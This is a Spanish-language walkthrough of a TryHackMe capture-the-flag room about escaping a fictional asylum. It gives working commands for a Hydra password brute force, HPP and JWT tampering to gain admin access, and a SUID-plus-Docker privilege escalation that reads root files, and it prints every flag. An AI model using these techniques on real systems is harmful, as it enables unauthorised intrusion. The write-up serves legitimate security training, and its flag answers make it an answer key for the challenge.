# The Great Disappearing Act

| **Dificultad** | HARD | **Tipo** | CTF (Free Room) | **Slug** | `sq1-aoc2025-FzPnrt2SAu` | | **Link** | [TryHackMe](https://tryhackme.com/room/sq1-aoc2025-FzPnrt2SAu) | | **Seccion** | Advent of Cyber Tryhackme / Advent 2025 Side Quest 1 | | **Fuente** | texto oficial THM + walkthrough propio (basado en la sala oficial) | | **Componentes** | egg decode / nmap / ffuf / hydra / cgi / jwt / http parameter pollution / scada / docker / suid | | **Impacto** | Plan de escape del Asilo HopSec en 5 pasos: desbloquear celda, moverte por el lobby, bypassear el keypad, llegar al pasillo principal y escapar de la instalacion |

---

**Contexto:** Can you help Hopper escape his wrongful imprisonment in HopSec asylum? Hopper, ex-jefe del Red Team Bunny Battalion, fue coronado Court Jester por King Malhare y encerrado en HopSec Asylum. Debes seguir su plan de escape de 5 pasos: (1) desbloquear la celda, (2) moverte por el lobby, (3) bypassear el keypad del Psych Ward, (4) llegar al Main Corridor y (5) escapar de la instalacion.

**Egg Decode Password:** `now_you_see_me`

---

## Solucionario

### Task 1: Primera flag (Unlock Hopper's Cell)

**Explicacion:** Se resuelve el egg decode (password `now_you_see_me`) que desbloquea el firewall. Luego, se escanea con `nmap -sV -T4 -vv -O -A`. Se encuentran 4 puertos abiertos: 22 (ssh), 80 (HTTP - security console), 8080 (HTTP - proxy), 8000 (HTTP - Fakebook social media). El puerto 80 lleva a una security console, el 8000 a Fakebook y el 8080 redirige a la misma console del 80. Se usa ffuf y se encuentra `cgi-bin`. En Fakebook se registra con mail y password. En los comentarios de Fakebook hay pistas: Guard Hopkins nacio en 1982 (43 aniversario), su lagarto favorito es Johnnyboy, y menciona `/opt/hashcat-utils/src/combinator.bin` (sugiere combinar wordlists). Password leak en comentario: `Pizza1234$`. Email de Hopkins: `guard.hopkins@hopsecasylum.com`. Se combinan 2 wordlists (strings y numeros/simbolos) con `combinator.bin l1.txt l1.txt > l12.txt` y se corre Hydra en el puerto 8080 (no en 80): `hydra -s 8080 -t 16 -V -f -l "guard.hopkins@hopsecasylum.com" -P t12.txt 10.49.163.2 http-post-form "/cgi-bin/login.sh:username=^USER^&password=^PASS^:Invalid username or password"`. La password es `Johnnyboy1982!`. Se desbloquea la celda con el payload `/key_flag.sh?door=hopper`. Vulnerabilidad: CGI Script Manipulation.

| # | Pregunta | Respuesta |
| --- | --- | --- |
| 1 | What is the first flag? | `THM{h0pp1ing_m4d}` |

### Task 2: Segunda flag (Bypass Psych Ward Keypad)

**Explicacion:** Se enumera `nmap -sC -sV -p- 10.49.163.2` y el puerto mas interesante es el `13400` (HopSec Asylum Facility Video Portal). Se logra entrar al video portal con las credenciales del guard y se extrae el JWT token de localStorage. El servidor NO valida la firma JWT, asi que se modifica el token cambiando `"role":"guard"` a `"role":"admin"`. Al intentar request del admin camera (cam-admin) con token modificado: `curl -X POST` con `Authorization: Bearer` token modificado y `{"camera_id":"cam-admin","tier":"admin"}` devuelve 401 (la firma SI se validaba al cambiar el role). El breakthrough fue con HTTP Parameter Pollution, pasando `tier=admin` como query param mientras el body tenia `tier=guard`: `curl -X POST "http://10.48.191.182:13401/v1/streams/request?tier=admin" -H "Authorization: Bearer {valid_guard_token}" -d '{"camera_id":"cam-admin","tier":"guard"}'`. Esto devolvio `effective_tier: admin` con un valid admin ticket, explotando la prioridad de query params sobre body params. Se accedio al admin camera stream y el video mostro el keypad siendo accedido con el codigo `115879`. Solo se obtuvo la primera parte de la flag: `THM{Y0u_h4ve_b3en_`. La segunda parte: `j3stered_739138}`. Flag 2 combinada: `THM{Y0u_h4ve_b3en_j3stered_739138}`. En el camino se descubrio un diagnostics endpoint embebido en un HLS manifest, y leak de console token via job status monitoring. Desde la console shell se encontro un SCADA terminal en localhost: `ss -tlnp` -> `LISTEN 0 128 127.0.0.1:9001` (python3, pid 1234). Conexion: `nc 127.0.0.1 9001`. El SCADA pide maintenance token: Flag 2 (`THM{Y0u_h4ve_b3en_j3stered_739138}`) fue el SCADA token -> `[+] Access Granted. SCADA #LOCKED>`. Se requiere un numeric unlock code en `/root/.asylum/unlock_code` dentro del Docker container `asylum_gate_control`, pero corremos como `svc_vidops` sin root. Discovery de SUID: `find / -perm -4000 -type f 2>/dev/null` -> `/usr/local/bin/diag_shell` (setuid ELF 64-bit owned por `dockermgr` UID 1501). Key insight: el binario setea UID a dockermgr pero NO el GID. Para acceder a Docker se usa `sg docker`. Command chain: `echo 'sg docker -c "docker exec -u root asylum_gate_control cat /root/.asylum/unlock_code"' | /usr/local/bin/diag_shell` -> `739184627`. Desglose: 1) `diag_shell` spawns bash con UID dockermgr(1501); 2) `sg docker` ejecuta con docker group privileges; 3) `docker exec -u root` ejecuta como root dentro del container; 4) `cat /root/.asylum/unlock_code` lee el unlock code.

| # | Pregunta | Respuesta |
| --- | --- | --- |
| 2 | What is the second flag? | `THM{Y0u_h4ve_b3en_j3stered_739138}` |

### Task 3: Tercera flag (Reach Main Corridor / SCADA Bypass)

**Explicacion:** Se llega al Main Corridor con el SCADA terminal en localhost:9001. Con el unlock code `739184627`, se ejecuta: `curl -s -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "code=739184627" "http://127.0.0.1:8080/cgi-bin/exit_check.sh"`. Respuesta: `{"ok":true,"flag":"THM{p0p_go3s_THe_W3as3l}"}`. Escalada de privilegios explotando el binario `/usr/local/bin/diag_shell`.

| # | Pregunta | Respuesta |
| --- | --- | --- |
| 3 | What is the third flag? | `THM{p0p_go3s_THe_W3as3l}` |

### Task 4: Escape the Facility (Final Escape Door)

**Explicacion:** Se someten las 3 flags al `/escape_check.sh`: `curl -s -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "flag1=THM{h0pp1ing_m4d}&flag2=THM{Y0u_h4ve_b3en_j3stered_739138}&flag3=THM{p0p_go3s_THe_W3as3l}" http://127.0.0.1:8080/cgi-bin/escape_check.sh`. Respuesta: `{"ok": true, "invite_url": "https://static-labs.tryhackme.cloud/apps/hoppers-invitation/", "invite_code": "THM{There.is.no.EASTmas.without.Hopper}"}`.

| # | Pregunta | Respuesta |
| --- | --- | --- |
| 4 | Invite Code (Final) | `THM{There.is.no.EASTmas.without.Hopper}` |

---

**Metodologia:**

1. Egg decode (password `now_you_see_me`) para desbloquear firewall

2. Nmap enum: 22 ssh, 80/8080 http console, 8000 http Fakebook

3. ffuf: cgi-bin dir; recoleccion de pistas en comentarios de Fakebook

4. Combinar wordlists con `combinator.bin` + Hydra bruteforce en 8080

5. Login como guard.hopkins; extraer JWT de localStorage

6. HTTP Parameter Pollution (HPP) en el endpoint `/v1/streams/request` para escalar tier a admin

7. Obtener codigo del keypad (115879) del stream; parte 1 de flag 2

8. Diagnostics endpoint + console token leak; SCADA en localhost:9001

9. SUID `diag_shell` + `sg docker` + `docker exec -u root` para leer unlock code

10. exit_check.sh con code 739184627 -> flag 3

11. escape_check.sh con las 3 flags -> invite code

**Learning chain:** Egg Decode -> Nmap -> ffuf -> Combinator+Hydra -> JWT -> HPP -> Keypad -> SCADA -> SUID -> Docker -> 3 Flags -> Invite Code

**Leccion:** *La combinacion de HTTP Parameter Pollution, JWT manipulation y SUID misconfiguration en cascada permite pasar de un compromiso web a un escape completo del entorno restringido.*

**MITRE ATT&CK:**

- T1110 - Brute Force

- T1609 - Container Administration Command

- T1548 - Abuse Elevation Control Mechanism

- T1059 - Command and Scripting Interpreter

- T1190 - Exploit Public-Facing Application

**Fuente:** [TryHackMe - The Great Disappearing Act](https://tryhackme.com/room/sq1-aoc2025-FzPnrt2SAu)